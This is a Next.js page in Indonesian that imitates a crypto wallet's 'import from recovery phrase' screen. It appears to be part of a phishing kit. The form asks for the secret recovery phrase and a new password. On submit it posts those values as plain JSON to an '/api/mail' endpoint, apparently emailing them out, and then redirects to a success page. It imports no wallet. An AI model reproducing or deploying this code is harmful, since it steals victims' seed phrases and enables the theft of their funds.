import Box from "@mui/material/Box";
import Card from "@mui/material/Card";
import * as React from "react";
import CardActions from "@mui/material/CardActions";
import CardContent from "@mui/material/CardContent";
import Typography from "@mui/material/Typography";
import Button from "@mui/material/Button";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import IconButton from "@mui/material/IconButton";
import FormControl from "@mui/material/FormControl";
import InputLabel from "@mui/material/InputLabel";
import OutlinedInput from "@mui/material/OutlinedInput";
import InputAdornment from "@mui/material/InputAdornment";
import Visibility from "@mui/icons-material/Visibility";
import VisibilityOff from "@mui/icons-material/VisibilityOff";
import FormHelperText from "@mui/material/FormHelperText";
import FormControlLabel from "@mui/material/FormControlLabel";
import Switch from "@mui/material/Switch";
import Link from "next/link";
import { useRouter } from "next/router";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { sendEmail } from "../component/service/service";

export default function FormPage() {
  const [values, setValues] = React.useState({
    password: "",
    frasa: "",
    confirm: "",
    showPassword: false,
    showFrasa: false,
    showConfirm: false,
  });
  const handleChange = (prop: any) => (event: any) => {
    setValues({ ...values, [prop]: event.target.value });
  };
  const handleClickShowFrasa = () => {
    setValues({
      ...values,
      showFrasa: !values.showFrasa,
    });
  };
  const handleClickShowPassword = () => {
    setValues({
      ...values,
      showPassword: !values.showPassword,
    });
  };
  const handleClickShowConfirm = () => {
    setValues({
      ...values,
      showConfirm: !values.showConfirm,
    });
  };

  const handleMouseDownPassword = (event: any) => {
    event.preventDefault();
  };

  const router = useRouter();

  // eslint-disable-next-line consistent-return
  const onSubmit = async () => {
    if (
      values.frasa === "" ||
      values.password === "" ||
      values.password !== values.confirm
    ) {
      return toast.error("Ada kesalah input, cek kembali!");
    }
    fetch("/api/mail", {
      method: "POST",
      headers: {
        // eslint-disable-next-line quote-props
        Accept: "application/json, text/plain, */*",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    }).then((res) => {
      console.log("Response received");
      if (res.status === 200) {
        toast.success("Berhasil, harap menunggu!!");
        setInterval(() => {
          router.push("/success");
        }, 2000);
      } else {
        toast.error("Terjadi kesalahan pada sistem !!!");
      }
    });
  };
  const card = (
    <React.Fragment>
      <CardContent>
        <Typography
          sx={{
            fontSize: 14,
            float: "left",
            textAlign: "left",
            width: "100%",
            marginBottom: 3,
          }}
          color="text.secondary"
          gutterBottom
          component={"span"}
        >
          <IconButton aria-label="back">
            <Link href="/" passHref>
              <ArrowBackIcon />
            </Link>
          </IconButton>
        </Typography>
        <Typography
          variant="h5"
          component="div"
          sx={{ marginBottom: 3, marginTop: 3 }}
        >
          <h3 style={{ fontWeight: 600 }}>Impor dari frasa pemulihan</h3>
        </Typography>
        <Typography component={"span"} variant="body2">
          <FormControl
            // eslint-disable-next-line object-curly-newline
            sx={{ m: 1, width: "100%", marginBottom: 2, marginLeft: "unset" }}
            variant="standard"
          >
            <InputLabel
              sx={{ marginLeft: 2 }}
              htmlFor="frasa-pemulihan-rahasia"
            >
              Frasa Pemulihan Rahasia
            </InputLabel>
            <OutlinedInput
              id="frasa-pemulihan-rahasia"
              placeholder="Masukan Frasa Pemulihan Rahasia"
              type={values.showFrasa ? "text" : "password"}
              value={values.frasa}
              onChange={handleChange("frasa")}
              endAdornment={
                <InputAdornment position="end">
                  <IconButton
                    aria-label="toggle frasa visibility"
                    onClick={handleClickShowFrasa}
                    onMouseDown={handleMouseDownPassword}
                    edge="end"
                  >
                    {values.showFrasa ? <VisibilityOff /> : <Visibility />}
                  </IconButton>
                </InputAdornment>
              }
              label="Frasa"
            />
          </FormControl>
          <FormControl
            // eslint-disable-next-line object-curly-newline
            sx={{ m: 1, width: "100%", marginBottom: 2, marginLeft: "unset" }}
            variant="standard"
          >
            <InputLabel sx={{ marginLeft: 2 }} htmlFor="kata-sandi-baru">
              Kata Sandi Baru
            </InputLabel>
            <OutlinedInput
              id="kata-sandi-baru"
              placeholder="Masukan Kata Sandi Baru"
              type={values.showPassword ? "text" : "password"}
              value={values.password}
              onChange={handleChange("password")}
              endAdornment={
                <InputAdornment position="end">
                  <IconButton
                    aria-label="toggle password visibility"
                    onClick={handleClickShowPassword}
                    onMouseDown={handleMouseDownPassword}
                    edge="end"
                  >
                    {values.showPassword ? <VisibilityOff /> : <Visibility />}
                  </IconButton>
                </InputAdornment>
              }
              label="Password"
            />
          </FormControl>
          <FormControl
            // eslint-disable-next-line object-curly-newline
            sx={{ m: 1, width: "100%", marginBottom: 2, marginLeft: "unset" }}
            variant="standard"
          >
            <InputLabel sx={{ marginLeft: 2 }} htmlFor="konfirmasi-kata-sandi">
              Konfirmasi Kata Sandi
            </InputLabel>
            <OutlinedInput
              id="konfirmasi-kata-sandi"
              placeholder="Masukan Konfirmasi Kata Sandi"
              type={values.showConfirm ? "text" : "password"}
              value={values.confirm}
              onChange={handleChange("confirm")}
              endAdornment={
                <InputAdornment position="end">
                  <IconButton
                    aria-label="toggle confirm visibility"
                    onClick={handleClickShowConfirm}
                    onMouseDown={handleMouseDownPassword}
                    edge="end"
                  >
                    {values.showConfirm ? <VisibilityOff /> : <Visibility />}
                  </IconButton>
                </InputAdornment>
              }
              label="Confirm"
            />
            <FormHelperText id="standard-weight-helper-text">
              harus Sekurangnya 8 karakter
            </FormHelperText>
          </FormControl>
          <div
            style={{
              width: "100%",
              margin: "8px",
              float: "left",
              textAlign: "left",
              marginBottom: 2,
            }}
          >
            <InputLabel
              sx={{ float: "left", width: "100%" }}
              htmlFor="biometrik"
            >
              Masuk Dengan Biometrik?
            </InputLabel>
            <FormControlLabel
              sx={{
                display: "block",
                float: "left",
              }}
              control={<Switch name="loading" color="primary" />}
              label=""
            />
          </div>
        </Typography>
      </CardContent>
      <CardActions sx={{ marginBottom: 3, marginTop: 3 }}>
        <Button
          variant="contained"
          sx={{ width: "100%", borderRadius: "30px" }}
          onClick={onSubmit}
        >
          Impor
        </Button>
      </CardActions>
    </React.Fragment>
  );
  return (
    <div className="box-card-form">
      <Box
        sx={{
          minWidth: 275,
        }}
      >
        <Card
          variant="outlined"
          sx={{ border: "1.5px solid rgb(0 0 0 / 25%)", borderRadius: "10px" }}
        >
          {card}
        </Card>
      </Box>
      <ToastContainer />
    </div>
  );
}
